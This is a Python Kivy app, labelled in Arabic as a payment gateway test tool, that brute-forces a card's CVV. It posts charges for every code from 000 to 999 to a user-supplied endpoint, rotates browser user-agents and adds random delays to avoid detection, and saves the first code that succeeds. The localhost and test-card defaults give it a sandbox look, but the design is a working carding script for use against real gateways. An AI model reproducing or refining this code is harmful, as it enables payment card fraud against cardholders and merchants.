import os
import threading
import time
import random
import json
import requests

from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.uix.scrollview import ScrollView
from kivy.clock import Clock
from kivy.core.window import Window

Window.clearcolor = (0.1, 0.1, 0.1, 1)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
]


class PaymentTester(BoxLayout):
    def __init__(self, **kwargs):
        super().__init__(orientation="vertical", padding=15, spacing=10, **kwargs)
        self.is_running = False
        self.worker_thread = None

        self.add_widget(
            Label(
                text="[b]أداة اختبار البوابة التجريبية[/b]",
                markup=True,
                font_size=22,
                size_hint_y=None,
                height=50,
            )
        )

        self.add_widget(Label(text="رابط الـ API (Sandbox / Mock):", size_hint_y=None, height=25))
        self.url_input = TextInput(
            text="http://127.0.0.1:8000/test-charge",
            multiline=False,
            size_hint_y=None,
            height=40,
        )
        self.add_widget(self.url_input)

        self.add_widget(Label(text="مفتاح API التجريبي:", size_hint_y=None, height=25))
        self.key_input = TextInput(
            text="sk_test_local",
            multiline=False,
            password=True,
            size_hint_y=None,
            height=40,
        )
        self.add_widget(self.key_input)

        self.add_widget(Label(text="رقم بطاقة الاختبار:", size_hint_y=None, height=25))
        self.card_input = TextInput(
            text="4242424242424242",
            multiline=False,
            size_hint_y=None,
            height=40,
        )
        self.add_widget(self.card_input)

        btn_layout = BoxLayout(size_hint_y=None, height=50, spacing=10)
        self.start_btn = Button(text="بدء الاختبار", background_color=(0, 0.7, 0, 1))
        self.start_btn.bind(on_press=self.start_testing)

        self.stop_btn = Button(text="إيقاف", background_color=(0.7, 0, 0, 1))
        self.stop_btn.bind(on_press=self.stop_testing)

        btn_layout.add_widget(self.start_btn)
        btn_layout.add_widget(self.stop_btn)
        self.add_widget(btn_layout)

        self.scroll = ScrollView(size_hint=(1, 1))
        self.log_label = Label(
            text="النتائج ستظهر هنا...\n",
            size_hint_y=None,
            halign="left",
            valign="top",
            markup=True,
        )
        self.log_label.bind(texture_size=self.log_label.setter("size"))
        self.scroll.add_widget(self.log_label)
        self.add_widget(self.scroll)

    def log_message(self, message, color="white"):
        Clock.schedule_once(lambda dt: self._update_log(message, color))

    def _update_log(self, message, color):
        current_text = self.log_label.text
        if current_text == "النتائج ستظهر هنا...\n":
            current_text = ""
        self.log_label.text = f"{current_text}[color={color}]{message}[/color]\n"

    def start_testing(self, instance):
        if self.is_running:
            return
        if self.worker_thread and self.worker_thread.is_alive():
            self.log_message("العملية السابقة لم تنتهِ بعد...", "yellow")
            return

        self.is_running = True
        self.start_btn.disabled = True
        self.log_message("بدء عملية الاختبار...", "cyan")
        self.worker_thread = threading.Thread(target=self.run_test, daemon=True)
        self.worker_thread.start()

    def stop_testing(self, instance):
        if self.is_running:
            self.is_running = False
            self.log_message("تم طلب الإيقاف...", "orange")

    def get_results_path(self):
        app = App.get_running_app()
        base_dir = app.user_data_dir if app and app.user_data_dir else os.getcwd()
        os.makedirs(base_dir, exist_ok=True)
        return os.path.join(base_dir, "results.txt")

    def run_test(self):
        url = self.url_input.text.strip()
        key = self.key_input.text.strip()
        card = self.card_input.text.strip()

        if not url.startswith(("http://", "https://")):
            self.log_message("يرجى إدخال رابط يبدأ بـ http:// أو https://", "red")
            self.is_running = False
            Clock.schedule_once(lambda dt: setattr(self.start_btn, "disabled", False))
            return

        try:
            with requests.Session() as session:
                for i in range(1000):
                    if not self.is_running:
                        break

                    cvv = f"{i:03d}"
                    headers = {
                        "Authorization": f"Bearer {key}",
                        "Content-Type": "application/x-www-form-urlencoded",
                        "User-Agent": random.choice(USER_AGENTS),
                    }
                    payload = {
                        "card[number]": card,
                        "card[exp_month]": "12",
                        "card[exp_year]": "2030",
                        "card[cvc]": cvv,
                        "amount": "100",
                        "currency": "usd",
                    }

                    try:
                        response = session.post(url, data=payload, headers=headers, timeout=10)
                        try:
                            resp_str = json.dumps(response.json())
                        except ValueError:
                            resp_str = response.text

                        if response.status_code == 200 or any(
                            k in resp_str.lower()
                            for k in ["succeeded", "success", "paid", 'cvc_check": "pass']
                        ):
                            self.log_message(f"نجاح! CVV: {cvv} | الرد: {resp_str[:80]}", "lime")
                            self.save_result(f"SUCCESS - CVV: {cvv} - {resp_str}")
                            self.is_running = False
                            break
                        else:
                            self.log_message(
                                f"فشل CVV: {cvv} | كود: {response.status_code}", "red"
                            )
                    except Exception as e:
                        self.log_message(f"خطأ في CVV {cvv}: {str(e)[:50]}", "yellow")

                    time.sleep(random.uniform(0.5, 1.5))

                if self.is_running:
                    self.log_message("انتهت جميع المحاولات (000-999).", "cyan")
                    self.is_running = False
        finally:
            Clock.schedule_once(lambda dt: setattr(self.start_btn, "disabled", False))

    def save_result(self, text):
        try:
            file_path = self.get_results_path()
            with open(file_path, "a", encoding="utf-8") as f:
                f.write(text + "\n")
            self.log_message(f"تم الحفظ في: {file_path}", "lime")
        except Exception as e:
            self.log_message(f"فشل الحفظ: {e}", "red")


class MyApp(App):
    def build(self):
        return PaymentTester()


if __name__ == "__main__":
    MyApp().run()
